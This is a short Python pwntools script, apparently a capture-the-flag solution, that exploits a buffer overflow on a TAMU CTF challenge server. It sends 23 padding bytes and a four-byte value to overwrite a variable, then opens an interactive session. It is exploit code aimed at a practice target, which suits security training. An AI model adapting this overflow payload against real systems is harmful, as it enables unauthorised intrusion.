#Simple buffer overflow that leads to an overwritten variable

from pwn import *

context.log_level = 'debug'

r = remote('pwn.ctf.tamu.edu',4321)
exp = ("A" * 23)
exp += "\x11\xba\x07\xf0"
r.sendline(exp)
r.interactive()
